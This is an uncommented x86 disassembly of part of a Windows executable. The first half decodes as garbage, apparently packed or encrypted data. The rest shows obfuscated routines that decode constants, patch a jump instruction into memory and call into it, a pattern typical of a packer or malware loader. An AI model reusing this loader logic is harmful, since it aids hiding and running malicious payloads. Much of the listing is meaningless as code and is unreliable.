  409a7d:	pop    es
  409a7e:	inc    ebp
  409a7f:	jns    0x409a23
  409a81:	outs   dx,DWORD PTR ds:[esi]
  409a82:	aam    0x2c
  409a84:	adc    al,0x75
  409a86:	fst    QWORD PTR [eax+ecx*2-0x30]
  409a8a:	inc    ebx
  409a8b:	pop    eax
  409a8c:	sbb    eax,0xb3d07ff
  409a91:	(bad)  
  409a92:	dec    esp
  409a93:	push   esp
  409a94:	and    al,0xee
  409a96:	jecxz  0x409aa6
  409a98:	into   
  409a99:	fld    DWORD PTR [eax-0x1a1eeac5]
  409a9f:	lea    edx,[esi-0x4c58c0a7]
  409aa5:	mov    al,0x33
  409aa7:	out    0x26,eax
  409aa9:	fidiv  WORD PTR [esi+0x4d]
  409aac:	cwde   
  409aad:	mov    WORD PTR [eax+eiz*4+0x224b2345],fs
  409ab4:	retf   0x777c
  409ab7:	and    DWORD PTR [edx-0x5f],esi
  409aba:	push   cs
  409abb:	add    ah,BYTE PTR [eax-0x25]
  409abe:	mov    al,ds:0x14d2bf5f
  409ac3:	sub    BYTE PTR [edi+edi*4+0x79],ch
  409ac7:	adc    DWORD PTR [eax],ebx
  409ac9:	mov    al,0x92
  409acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409acc:	das    
  409acd:	icebp  
  409ace:	xor    eax,0x99ab3327
  409ad3:	std    
  409ad4:	test   eax,0xffa9fd91
  409ad9:	xchg   edi,eax
  409ada:	int    0xab
  409adc:	inc    ecx
  409add:	mov    edi,0xd81da6c8
  409ae2:	inc    edi
  409ae3:	jae    0x409a9d
  409ae5:	xchg   esp,eax
  409ae6:	mov    eax,ds:0x814ca838
  409aeb:	ret    0x7a5e
  409aee:	(bad)  
  409aef:	retf   0x6007
  409af2:	mov    esp,0x5911bfbc
  409af7:	jmp    0x89155393
  409afc:	sub    edi,eax
  409afe:	inc    edx
  409aff:	mov    ch,0x6e
  409b01:	(bad)  
  409b02:	mov    eax,0xc8e49894
  409b07:	fdiv   QWORD PTR [edi]
  409b09:	enter  0x11b2,0xc9
  409b0d:	cmp    ecx,DWORD PTR ds:0xcf4e44e1
  409b13:	push   ebp
  409b14:	inc    BYTE PTR ds:0xf50a4a6
  409b1a:	sbb    al,0x9e
  409b1c:	push   ebx
  409b1d:	popf   
  409b1e:	pop    ebp
  409b1f:	fcom   DWORD PTR [eax+ebp*8+0x1272f49d]
  409b26:	bound  edi,QWORD PTR [eax]
  409b28:	inc    eax
  409b29:	imul   eax,DWORD PTR [ebx],0x4a
  409b2c:	sti    
  409b2d:	cs cmc 
  409b2f:	in     al,0xf6
  409b31:	jmp    0x409b9a
  409b33:	inc    edi
  409b34:	(bad)  
  409b35:	xchg   edi,eax
  409b36:	loop   0x409b49
  409b38:	jae    0x409af3
  409b3a:	adc    al,0xc9
  409b3c:	std    
  409b3d:	mov    edi,0xb52d15a0
  409b42:	sbb    edx,ecx
  409b44:	aam    0x85
  409b46:	addr16 fwait
  409b48:	repnz shl DWORD PTR [edx],cl
  409b4b:	mov    cl,0x69
  409b4d:	push   edi
  409b4e:	in     al,dx
  409b4f:	fisub  DWORD PTR [ebx-0x5681246c]
  409b55:	jo     0x409b1d
  409b57:	push   edx
  409b58:	ss push 0xdf147d8
  409b5e:	jmp    0xa7e9:0x34b7291e
  409b65:	sbb    DWORD PTR [edx+0x6a],ebx
  409b68:	push   es
  409b69:	jmp    0x21d9:0xda2621d4
  409b70:	retf   0xbc14
  409b73:	mov    eax,0x1e97ca49
  409b78:	adc    BYTE PTR ds:0xa17c7ba4,bh
  409b7e:	icebp  
  409b7f:	retf   0x872c
  409b82:	inc    edx
  409b83:	or     al,0xba
  409b85:	mov    edx,0xc66e443d
  409b8a:	sbb    eax,0x857973c5
  409b8f:	paddq  mm3,QWORD PTR [ebx+0x49e6e158]
  409b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b97:	loopne 0x409b37
  409b99:	adc    al,0x16
  409b9b:	and    DWORD PTR [edx],edx
  409b9d:	add    eax,eax
  409b9f:	push   edi
  409ba0:	es push ebx
  409ba2:	retf   
  409ba3:	and    DWORD PTR [edx-0x1e34dd02],ebp
  409ba9:	popf   
  409baa:	mov    ecx,0x7f14b0f1
  409baf:	scas   eax,DWORD PTR es:[edi]
  409bb0:	ret    0x1183
  409bb3:	mov    ds:0x763c9703,al
  409bb8:	fisttp DWORD PTR [ebx-0x1]
  409bbb:	cmp    dl,BYTE PTR [ebx+0x7ebcdbb3]
  409bc1:	add    al,0xdd
  409bc3:	xor    BYTE PTR [edx],cl
  409bc5:	out    0xa7,al
  409bc7:	push   ebp
  409bc8:	lods   eax,DWORD PTR ds:[esi]
  409bc9:	sub    al,0xcd
  409bcb:	ret    
  409bcc:	xor    eax,0xd3041f02
  409bd1:	sbb    BYTE PTR [ecx+0x30ce2f54],dh
  409bd7:	pushf  
  409bd8:	imul   edi,DWORD PTR [edi-0x22cc25f9],0xf4c5f913
  409be2:	and    BYTE PTR [esi-0x75b32079],bh
  409be8:	sbb    eax,0xac6284ba
  409bed:	sti    
  409bee:	out    dx,al
  409bef:	pop    esi
  409bf0:	call   0x653d:0xa70764fc
  409bf7:	or     esp,DWORD PTR [eax]
  409bf9:	push   0x6f9db287
  409bfe:	and    ch,bl
  409c00:	(bad)  
  409c01:	scas   al,BYTE PTR es:[edi]
  409c02:	dec    BYTE PTR [edx-0x2158fbdb]
  409c08:	addr16 das 
  409c0a:	loope  0x409b9e
  409c0c:	inc    edi
  409c0d:	pop    es
  409c0e:	pushf  
  409c0f:	jmp    FWORD PTR [ebx-0x2fdb5cf]
  409c15:	ret    0x752a
  409c18:	and    DWORD PTR [ebx+0x6c],esp
  409c1b:	pop    esp
  409c1c:	sbb    eax,DWORD PTR [esi+0x2d]
  409c1f:	add    DWORD PTR [edx],0xd25b3fda
  409c25:	shl    BYTE PTR [eax],cl
  409c27:	test   al,0x8a
  409c29:	dec    ecx
  409c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c2b:	sbb    DWORD PTR [ecx+0x3c],ebp
  409c2e:	jecxz  0x409c40
  409c30:	std    
  409c31:	je     0x409c59
  409c33:	maskmovq mm1,(bad)
  409c34:	test   DWORD PTR [ebx-0x5243ff3b],0x36055b8c
  409c3e:	sbb    eax,0x521b3fc2
  409c43:	jmp    0x409bef
  409c45:	rcr    ch,cl
  409c47:	call   0xe5cc3d52
  409c4c:	sub    ecx,esp
  409c4e:	mov    DWORD PTR [eax-0x16],ecx
  409c51:	mov    ds:0xd056d0a8,eax
  409c56:	push   ds
  409c57:	pop    ebx
  409c58:	loop   0x409cac
  409c5a:	mov    ch,0xc0
  409c5c:	add    al,0xe8
  409c5e:	test   al,0xfd
  409c60:	or     eax,0x8e12f88a
  409c65:	pop    ebp
  409c66:	jno    0x409c7a
  409c68:	inc    edx
  409c69:	mov    fs,WORD PTR [ebx]
  409c6b:	jle    0x409c69
  409c6d:	ror    BYTE PTR [edi+0x5d89cf3b],cl
  409c73:	test   bh,dh
  409c75:	jmp    0x409c2b
  409c77:	jle    0x409cd7
  409c79:	data16 mov dl,bl
  409c7c:	out    dx,eax
  409c7d:	xchg   edi,eax
  409c7e:	dec    eax
  409c7f:	sub    eax,0xfdb3b6e6
  409c84:	xor    eax,0xce7a0bf9
  409c89:	lock jnp 0x409c33
  409c8c:	test   DWORD PTR [ecx],esp
  409c8e:	push   0xa00f389a
  409c93:	addr16 and eax,0x63530a32
  409c99:	js     0x409cd8
  409c9b:	add    bh,0xdc
  409c9e:	push   ebx
  409c9f:	adc    BYTE PTR [ebp-0x247b70d5],ch
  409ca5:	jge    0x409c76
  409ca7:	sbb    al,BYTE PTR ss:0xde576476
  409cae:	mov    BYTE PTR [ecx-0x47],0x4f
  409cb2:	fisub  DWORD PTR [ebp-0xa]
  409cb5:	jmp    0x2fa02ee9
  409cba:	fild   DWORD PTR [esi+0x3117b6d9]
  409cc0:	and    ebx,ebp
  409cc2:	push   ss
  409cc3:	sar    BYTE PTR [ebx-0x4b],0x8b
  409cc7:	fwait
  409cc8:	inc    BYTE PTR [esi+0x67]
  409ccb:	inc    ebp
  409ccc:	rol    DWORD PTR ds:0xbfd4fa12,0x9
  409cd3:	mov    ebx,0xb40d4b4e
  409cd8:	mov    ebp,0x13df7717
  409cdd:	or     al,0xc3
  409cdf:	pop    edx
  409ce0:	jp     0x409cf4
  409ce2:	mov    dl,0x1b
  409ce4:	inc    ebp
  409ce5:	imul   edx,DWORD PTR [edi],0xb59f5f6d
  409ceb:	push   0x46dc187f
  409cf0:	push   eax
  409cf1:	jne    0x409d6b
  409cf3:	xor    BYTE PTR [ecx-0x4acba88f],dh
  409cf9:	fldcw  WORD PTR [ebx]
  409cfb:	mov    al,0x42
  409cfd:	inc    ebp
  409cfe:	pop    edx
  409cff:	sbb    edx,eax
  409d01:	inc    edx
  409d02:	mov    edx,0xcb41e30f
  409d07:	mov    bh,0x96
  409d09:	pop    DWORD PTR [eax+esi*8]
  409d0c:	icebp  
  409d0d:	aad    0xca
  409d0f:	shl    dl,0xd7
  409d12:	sub    ecx,esi
  409d14:	cmp    eax,0x660dc5f5
  409d19:	sbb    cl,BYTE PTR [eax]
  409d1b:	loope  0x409d44
  409d1d:	jno    0x409d4a
  409d1f:	jmp    0x409ceb
  409d21:	fnstsw WORD PTR [esi]
  409d23:	push   0x6e444b47
  409d28:	sub    dh,dh
  409d2a:	pusha  
  409d2b:	xor    eax,DWORD PTR [eax+0x49]
  409d2e:	push   ebp
  409d2f:	pop    esp
  409d30:	cld    
  409d31:	lods   eax,DWORD PTR ds:[esi]
  409d32:	lock pushf 
  409d34:	call   0x179e:0x24faafdf
  409d3b:	arpl   dx,bx
  409d3d:	out    dx,eax
  409d3e:	mov    ecx,0xee6bf54
  409d44:	out    0x9f,eax
  409d46:	dec    esp
  409d47:	fwait
  409d48:	shr    BYTE PTR [ebp+0x767e1745],cl
  409d4e:	xchg   edx,eax
  409d4f:	outs   dx,BYTE PTR ds:[esi]
  409d50:	sbb    BYTE PTR [ecx],0x88
  409d53:	aaa    
  409d54:	shl    esi,cl
  409d56:	imul   edx,DWORD PTR [edi],0xeb5a19d0
  409d5c:	add    BYTE PTR [ecx-0x6430c740],cl
  409d62:	mov    bh,0x99
  409d64:	retf   
  409d65:	shl    DWORD PTR [esi+0x2e45f30b],0xe4
  409d6c:	push   ebx
  409d6d:	jle    0x409d2e
  409d6f:	fimul  DWORD PTR [edx-0x3f8e6675]
  409d75:	call   0x77dc877b
  409d7a:	dec    ebx
  409d7b:	fcom   DWORD PTR [edi-0x749fb1eb]
  409d81:	dec    ecx
  409d82:	push   cs
  409d83:	neg    dl
  409d85:	test   BYTE PTR [ebp-0x386240dc],ah
  409d8b:	push   0xd26e55e5
  409d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d91:	jae    0x409d3b
  409d93:	pop    ds
  409d94:	aas    
  409d95:	loop   0x409d7e
  409d97:	test   al,0x92
  409d99:	repz pop ss
  409d9b:	dec    esi
  409d9c:	fadd   DWORD PTR gs:[edx]
  409d9f:	fwait
  409da0:	retf   0x824f
  409da3:	xchg   DWORD PTR fs:[eax],esi
  409da6:	xlat   BYTE PTR ds:[ebx]
  409da7:	push   edi
  409da8:	int    0x67
  409daa:	push   esp
  409dab:	cmp    BYTE PTR fs:[eax-0x78d1f5ed],dh
  409db2:	scas   eax,DWORD PTR es:[edi]
  409db3:	pop    ss
  409db4:	mov    gs,WORD PTR ds:0x2d8d3254
  409dba:	(bad)  
  409dbb:	sbb    eax,0x82d418a5
  409dc0:	adc    eax,0x17dbcbd8
  409dc5:	cwde   
  409dc6:	imul   esi,DWORD PTR [esi-0x79],0xffffff86
  409dca:	push   ds
  409dcb:	xor    al,0xd9
  409dcd:	aaa    
  409dce:	mov    dl,0xc0
  409dd0:	xchg   ebp,eax
  409dd1:	fcmovb st,st(3)
  409dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dd4:	mov    esi,DWORD PTR [edx]
  409dd6:	pand   mm3,QWORD PTR ds:0x924ac9d0
  409ddd:	int    0x78
  409ddf:	mov    edx,0x783f4cd6
  409de4:	or     eax,0xe74a89e6
  409de9:	sbb    al,0x54
  409deb:	daa    
  409dec:	cs jle 0x409dc1
  409def:	pop    eax
  409df0:	cli    
  409df1:	cmp    BYTE PTR [eax],ah
  409df3:	jmp    0x8f1d:0x6b6e6d10
  409dfa:	sbb    ah,BYTE PTR [ecx+0x0]
  409dfd:	adc    BYTE PTR [edi],al
  409dff:	call   0x2c181638
  409e04:	jnp    0x409e6d
  409e06:	xor    BYTE PTR [edx+0x63],bh
  409e09:	fistp  DWORD PTR [ebx]
  409e0b:	out    dx,al
  409e0c:	test   dh,ah
  409e0e:	xor    DWORD PTR [edi+eiz*4],esp
  409e11:	and    bl,BYTE PTR [ebx]
  409e13:	stos   DWORD PTR es:[edi],eax
  409e14:	mov    cl,0xf9
  409e16:	rcl    ch,1
  409e18:	pushf  
  409e19:	adc    BYTE PTR [edx],ch
  409e1b:	inc    ebx
  409e1c:	stc    
  409e1d:	mov    ds:0x30ae72e5,eax
  409e22:	adc    edi,DWORD PTR ds:[ebx+eax*4+0x53963f41]
  409e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e2b:	sbb    al,0xa1
  409e2d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e2f:	mov    bl,BYTE PTR [ebx-0x3370d207]
  409e35:	and    dl,BYTE PTR [ecx-0x4d1367b5]
  409e3b:	lods   eax,DWORD PTR ds:[esi]
  409e3c:	mov    ah,0x26
  409e3e:	ret    0x1d3
  409e41:	sbb    edi,ebp
  409e43:	shr    DWORD PTR [edx+0x65],1
  409e46:	cmp    ebp,edx
  409e48:	adc    ch,BYTE PTR [esi+0x1836e90d]
  409e4e:	adc    dl,BYTE PTR [edi]
  409e50:	jl     0x409e87
  409e52:	inc    ebp
  409e53:	daa    
  409e54:	js     0x409e9e
  409e56:	addr16 adc eax,0xf14c5a4c
  409e5c:	aam    0xfb
  409e5e:	push   es
  409e5f:	pop    ss
  409e60:	xchg   ebx,eax
  409e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e62:	adc    DWORD PTR [ecx],edx
  409e64:	jnp    0x409e73
  409e66:	out    dx,al
  409e67:	cmp    ebx,ebp
  409e69:	dec    ebp
  409e6a:	and    eax,0xf28100ae
  409e6f:	loope  0x409e80
  409e71:	scas   eax,DWORD PTR es:[edi]
  409e72:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  409e78:	mov    ecx,DWORD PTR [ebp+0x8]
  409e7b:	lea    ecx,[edx+ecx*1+0x3272dd]
  409e82:	cmp    ecx,eax
  409e84:	je     0x409efb
  409e8a:	mov    edi,DWORD PTR [ebp-0x14]
  409e8d:	mov    eax,DWORD PTR [ebp+0x8]
  409e90:	mov    edx,DWORD PTR [ebp+0x14]
  409e93:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  409e97:	mov    ecx,0x7510896
  409e9c:	xor    edx,edx
  409e9e:	xor    edi,ecx
  409ea0:	mov    esi,0x3272dd
  409ea5:	add    edi,esi
  409ea7:	div    edi
  409ea9:	mov    edx,DWORD PTR [ebp-0x4]
  409eac:	xor    edx,ecx
  409eae:	lea    eax,[edx+eax*1+0x3272dd]
  409eb5:	mov    edx,DWORD PTR [ebp+0x8]
  409eb8:	mov    edi,DWORD PTR [ebp-0x20]
  409ebb:	mov    DWORD PTR [edi+edx*4],eax
  409ebe:	mov    eax,DWORD PTR [ebp-0x14]
  409ec1:	mov    edx,DWORD PTR [ebp+0x8]
  409ec4:	xor    eax,ecx
  409ec6:	lea    eax,[eax+edx*1+0x3272dd]
  409ecd:	mov    DWORD PTR [ebp+0x8],eax
  409ed0:	mov    eax,DWORD PTR [ebp-0x14]
  409ed3:	mov    edx,DWORD PTR [ebp+0x14]
  409ed6:	xor    eax,ecx
  409ed8:	add    eax,esi
  409eda:	imul   eax,DWORD PTR [edx]
  409edd:	mov    edx,DWORD PTR [ebp-0x4]
  409ee0:	xor    edx,ecx
  409ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  409ee5:	lea    ecx,[edx+ecx*1+0x3272dd]
  409eec:	cmp    ecx,eax
  409eee:	jne    0x409e8a
  409ef4:	mov    eax,esi
  409ef6:	jmp    0x409f00
  409efb:	mov    eax,0x3272dd
  409f00:	mov    ebx,0x7510896
  409f05:	mov    ecx,DWORD PTR [ebp-0x4]
  409f08:	xor    ecx,ebx
  409f0a:	add    ecx,eax
  409f0c:	mov    DWORD PTR [ebp-0xc],ecx
  409f0f:	mov    ebx,0x65655
  409f14:	add    ebx,0x3234
  409f1a:	xchg   ebx,esi
  409f1c:	xor    ebx,ebx
  409f1e:	push   esi
  409f1f:	mov    esi,ebx
  409f21:	pop    ebx
  409f22:	mov    edx,esi
  409f24:	add    ebx,0x1002
  409f2a:	lea    eax,[ebp-0x10]
  409f2d:	add    edx,eax
  409f2f:	add    edx,0x5
  409f32:	push   edx
  409f33:	inc    esi
  409f34:	pop    ecx
  409f35:	dec    ecx
  409f36:	xchg   ecx,eax
  409f37:	dec    eax
  409f38:	xchg   ecx,eax
  409f39:	dec    ecx
  409f3a:	xchg   ecx,edx
  409f3c:	dec    edx
  409f3d:	push   edx
  409f3e:	mov    edx,ebx
  409f40:	pop    ebx
  409f41:	dec    ebx
  409f42:	call   DWORD PTR [ebx]
  409f44:	cmp    DWORD PTR [ebp+0x10],esi
  409f47:	je     0x409f66
  409f4d:	xchg   edx,eax
  409f4e:	push   0xb
  409f50:	pop    ecx
  409f51:	push   0x4
  409f53:	pop    ebx
  409f54:	inc    ebx
  409f55:	xchg   ebx,ecx
  409f57:	sub    ebx,ecx
  409f59:	xchg   ebx,ecx
  409f5b:	dec    ecx
  409f5c:	dec    ecx
  409f5d:	mov    eax,DWORD PTR [ebp-0x1c]
  409f60:	imul   eax,ecx
  409f63:	add    esp,eax
  409f65:	xchg   edx,eax
  409f66:	push   eax
  409f67:	xor    ebx,ebx
  409f69:	mov    edx,esp
  409f6b:	dec    edx
  409f6c:	inc    ebx
  409f6d:	add    ebx,DWORD PTR [edx+ebx*1]
  409f70:	dec    ebx
  409f71:	xor    edx,edx
  409f73:	add    DWORD PTR [ebp-0xc],ebx
  409f76:	pop    ebx
  409f77:	mov    eax,DWORD PTR [ebp-0xc]
  409f7a:	pop    edi
  409f7b:	pop    esi
  409f7c:	pop    ebx
  409f7d:	leave  
  409f7e:	ret    0x10
  409f81:	push   ebp
  409f82:	mov    ebp,esp
  409f84:	sub    esp,0x7c
  409f87:	xor    ecx,ecx
  409f89:	xor    ecx,DWORD PTR ds:0x42c014
  409f8f:	xor    DWORD PTR ds:0x42d018,ecx
  409f95:	push   esi
  409f96:	push   edi
  409f97:	movzx  edi,WORD PTR ds:0x429014
  409f9e:	adc    edi,DWORD PTR ds:0x42c018
  409fa4:	mov    DWORD PTR ds:0x429014,edi
  409faa:	mov    eax,ds:0x42e435
  409faf:	or     ecx,0x9a5
  409fb5:	mov    DWORD PTR [ebp-0x24],eax
  409fb8:	mov    eax,ds:0x42e541
  409fbd:	mov    DWORD PTR [ebp-0x34],eax
  409fc0:	or     edi,eax
  409fc2:	and    DWORD PTR [ebp-0x30],0x0
  409fc6:	xor    DWORD PTR ds:0x429018,0x17b1
  409fd0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  409fd7:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  409fde:	mov    eax,DWORD PTR [ebp-0x10]
  409fe1:	mov    ecx,DWORD PTR [ebp-0x10]
  409fe4:	sub    eax,ecx
  409fe6:	mov    DWORD PTR [ebp-0x10],eax
  409fe9:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  409ff0:	and    DWORD PTR ds:0x42901c,0x0
  409ffa:	xor    eax,eax
  409ffc:	or     eax,DWORD PTR ds:0x42901c
  40a002:	inc    eax
  40a003:	mov    ds:0x42901c,eax
  40a008:	cmp    DWORD PTR ds:0x42901c,0xb
  40a00f:	jne    0x40a029
  40a015:	push   0x42e14e
  40a01a:	push   DWORD PTR [ebp-0xc]
  40a01d:	push   DWORD PTR [ebp-0x18]
  40a020:	push   DWORD PTR [ebp-0x24]
  40a023:	call   DWORD PTR ds:0x42ed61
  40a029:	cmp    DWORD PTR ds:0x42901c,0xa
  40a030:	jne    0x40a041
  40a036:	mov    eax,ds:0x42901c
  40a03b:	inc    eax
  40a03c:	mov    ds:0x42901c,eax
  40a041:	cmp    DWORD PTR ds:0x42901c,0x13
  40a048:	jb     0x409ffa
  40a04e:	sub    eax,esi
  40a050:	mov    eax,DWORD PTR [ebp-0x18]
  40a053:	mov    ecx,DWORD PTR [ebp-0x18]
  40a056:	sub    eax,ecx
  40a058:	mov    DWORD PTR [ebp-0x18],eax
  40a05b:	and    DWORD PTR ds:0x429000,0x0
  40a065:	mov    edi,DWORD PTR ds:0x429000
  40a06b:	inc    edi
  40a06c:	mov    DWORD PTR ds:0x429000,edi
  40a072:	cmp    DWORD PTR ds:0x429000,0xe
  40a079:	jne    0x40a08f
  40a07f:	push   0x429000
  40a084:	push   0x4a29
  40a089:	call   DWORD PTR ds:0x42ed65
  40a08f:	cmp    DWORD PTR ds:0x429000,0xd
  40a096:	jne    0x40a0ab
  40a09c:	xor    edi,edi
  40a09e:	or     edi,DWORD PTR ds:0x429000
  40a0a4:	inc    edi
  40a0a5:	mov    DWORD PTR ds:0x429000,edi
  40a0ab:	cmp    DWORD PTR ds:0x429000,0x1e
  40a0b2:	jb     0x40a065
  40a0b8:	and    eax,0x2f3f
  40a0bd:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  40a0c4:	mov    eax,DWORD PTR [ebp-0xc]
  40a0c7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a0ca:	or     edi,esi
  40a0cc:	sub    eax,ecx
  40a0ce:	xor    edi,edi
  40a0d0:	xor    edi,DWORD PTR ds:0x42d004
  40a0d6:	and    DWORD PTR ds:0x429008,edi
  40a0dc:	mov    DWORD PTR [ebp-0xc],eax
  40a0df:	sbb    DWORD PTR ds:0x42a018,0x66a3
  40a0e9:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40a0f0:	adc    DWORD PTR ds:0x42b010,ecx
  40a0f6:	mov    eax,DWORD PTR [ebp-0x1c]
  40a0f9:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a0fc:	xor    esi,esi
  40a0fe:	xor    esi,DWORD PTR ds:0x411fec
  40a104:	mov    edi,DWORD PTR ds:0x411ff8
  40a10a:	sub    edi,esi
  40a10c:	and    esi,DWORD PTR [esi+edi*1]
  40a10f:	sub    eax,ecx
  40a111:	and    DWORD PTR ds:0x42c008,0x0
  40a11b:	mov    ecx,DWORD PTR ds:0x42c008
  40a121:	inc    ecx
  40a122:	mov    DWORD PTR ds:0x42c008,ecx
  40a128:	cmp    DWORD PTR ds:0x42c008,0x16
  40a12f:	jne    0x40a159
  40a135:	push   0x2fca
  40a13a:	push   0x42c014
  40a13f:	push   0x8b86
  40a144:	push   0x42e0af
  40a149:	push   0x5b55
  40a14e:	push   0x1406
  40a153:	call   DWORD PTR ds:0x42ed6d
  40a159:	cmp    DWORD PTR ds:0x42c008,0x10
  40a160:	jb     0x40a11b
  40a166:	add    DWORD PTR ds:0x42a018,ecx
  40a16c:	mov    DWORD PTR [ebp-0x1c],eax
  40a16f:	adc    DWORD PTR ds:0x42d018,ebx
  40a175:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40a17c:	mov    eax,DWORD PTR [ebp-0x20]
  40a17f:	mov    ecx,DWORD PTR [ebp-0x20]
  40a182:	mov    DWORD PTR ds:0x42c014,0x17
  40a18c:	cmp    DWORD PTR ds:0x42c014,0x0
  40a193:	je     0x40a1be
  40a199:	cmp    DWORD PTR ds:0x42c014,0x22
  40a1a0:	jne    0x40a1ac
  40a1a6:	call   DWORD PTR ds:0x42ed71
  40a1ac:	mov    esi,DWORD PTR ds:0x42c014
  40a1b2:	dec    esi
  40a1b3:	mov    DWORD PTR ds:0x42c014,esi
  40a1b9:	jmp    0x40a18c
  40a1be:	sub    eax,ecx
  40a1c0:	and    DWORD PTR ds:0x42a004,0x0
  40a1ca:	jmp    0x40a1dc
  40a1cf:	mov    edi,DWORD PTR ds:0x42a004
  40a1d5:	inc    edi
  40a1d6:	mov    DWORD PTR ds:0x42a004,edi
  40a1dc:	cmp    DWORD PTR ds:0x42a004,0x15
  40a1e3:	jae    0x40a220
  40a1e9:	cmp    DWORD PTR ds:0x42a004,0x6
  40a1f0:	jne    0x40a201
  40a1f6:	push   0x42c008
  40a1fb:	call   DWORD PTR ds:0x42ed75
  40a201:	cmp    DWORD PTR ds:0x42a004,0x5
  40a208:	jne    0x40a21b
  40a20e:	mov    edi,DWORD PTR ds:0x42a004
  40a214:	inc    edi
  40a215:	mov    DWORD PTR ds:0x42a004,edi
  40a21b:	jmp    0x40a1cf
  40a220:	mov    DWORD PTR [ebp-0x20],eax
  40a223:	mov    eax,DWORD PTR [ebp-0x2c]
  40a226:	mov    ecx,DWORD PTR [ebp-0x20]
  40a229:	mov    esi,0x7510896
  40a22e:	xor    eax,esi
  40a230:	mov    edi,0x3272dd
  40a235:	add    eax,edi
  40a237:	or     eax,ecx
  40a239:	mov    DWORD PTR [ebp-0x20],eax
  40a23c:	mov    eax,DWORD PTR [ebp-0x4]
  40a23f:	mov    ecx,DWORD PTR [ebp-0x4]
  40a242:	sub    eax,ecx
  40a244:	mov    DWORD PTR [ebp-0x4],eax
  40a247:	or     DWORD PTR [ebp-0x4],0xf89c85be
  40a24e:	mov    eax,DWORD PTR [ebp-0xc]
  40a251:	xor    eax,esi
  40a253:	add    eax,edi
  40a255:	push   eax
  40a256:	mov    eax,DWORD PTR [ebp-0x10]
  40a259:	xor    eax,esi
  40a25b:	add    eax,edi
  40a25d:	push   eax
  40a25e:	mov    eax,DWORD PTR [ebp-0x4]
  40a261:	xor    eax,esi
  40a263:	add    eax,edi
  40a265:	push   eax
  40a266:	lea    eax,[ebp-0x7c]
  40a269:	push   eax
  40a26a:	push   DWORD PTR [ebp-0x2c]
  40a26d:	push   DWORD PTR [ebp-0x28]
  40a270:	call   0x40f163
  40a275:	test   eax,eax
  40a277:	je     0x40a2a5
  40a27d:	lea    eax,[ebp-0x7c]
  40a280:	push   eax
  40a281:	mov    eax,DWORD PTR [ebp-0x28]
  40a284:	xor    eax,esi
  40a286:	add    eax,edi
  40a288:	push   eax
  40a289:	mov    eax,DWORD PTR [ebp-0x24]
  40a28c:	add    eax,0xaa
  40a291:	push   eax
  40a292:	mov    eax,DWORD PTR [ebp-0x24]
  40a295:	mov    eax,DWORD PTR [eax+0x198]
  40a29b:	push   DWORD PTR [eax]
  40a29d:	call   0x40508b
  40a2a2:	mov    DWORD PTR [ebp-0x14],eax
  40a2a5:	lea    eax,[ebp+0x4]
  40a2a8:	mov    DWORD PTR [ebp-0x30],eax
  40a2ab:	mov    eax,DWORD PTR [ebp-0x14]
  40a2ae:	test   eax,eax
  40a2b0:	je     0x40a318
  40a2b6:	lea    eax,[ebp-0x8]
  40a2b9:	mov    DWORD PTR [ebp-0x38],eax
  40a2bc:	mov    eax,DWORD PTR [ebp-0x34]
  40a2bf:	mov    DWORD PTR [ebp-0x8],eax
  40a2c2:	mov    eax,DWORD PTR [ebp-0x8]
  40a2c5:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2c8:	sub    eax,ecx
  40a2ca:	mov    DWORD PTR [ebp-0x8],eax
  40a2cd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2d0:	xor    ecx,esi
  40a2d2:	mov    eax,0xffcd8d23
  40a2d7:	sub    eax,ecx
  40a2d9:	add    DWORD PTR [ebp-0x8],eax
  40a2dc:	mov    eax,DWORD PTR [ebp-0x8]
  40a2df:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2e2:	mov    DWORD PTR [ecx+0x1],eax
  40a2e5:	mov    eax,DWORD PTR [ebp-0x14]
  40a2e8:	push   DWORD PTR [ebp-0x24]
  40a2eb:	mov    BYTE PTR [eax],0xe9
  40a2ee:	mov    eax,ds:0x42e2b1
  40a2f3:	push   DWORD PTR [eax]
  40a2f5:	push   DWORD PTR ds:0x42e50d
  40a2fb:	push   DWORD PTR ds:0x42e2b9
  40a301:	push   DWORD PTR ds:0x42e4ed
  40a307:	push   DWORD PTR ds:0x42eafd
  40a30d:	push   DWORD PTR [ebp-0x28]
  40a310:	push   DWORD PTR [ebp-0x2c]
  40a313:	mov    eax,DWORD PTR [ebp-0x14]
  40a316:	call   eax
  40a318:	mov    eax,DWORD PTR [ebp-0x30]
  40a31b:	mov    ecx,DWORD PTR ds:0x42e4b1
  40a321:	add    DWORD PTR [eax],ecx
  40a323:	pop    edi
  40a324:	pop    esi
  40a325:	leave  
  40a326:	ret    
  40a327:	push   ebp
  40a328:	mov    ebp,esp
  40a32a:	sub    esp,0x18
  40a32d:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  40a334:	lea    eax,[ebp+0x14]
  40a337:	mov    DWORD PTR [ebp-0x4],eax
  40a33a:	add    edx,0x781f
  40a340:	push   esi
  40a341:	and    esi,esi
  40a343:	mov    esi,0xf89c85b5
  40a348:	mov    DWORD PTR [ebp-0xc],esi
  40a34b:	lea    eax,[ebp-0xc]
  40a34e:	mov    DWORD PTR [ebp-0x14],eax
  40a351:	mov    eax,DWORD PTR [ebp-0xc]
  40a354:	mov    edx,DWORD PTR [ebp-0x14]
  40a357:	mov    ecx,0x7510896
  40a35c:	and    DWORD PTR ds:0x42d010,0x34d
  40a366:	xor    eax,ecx
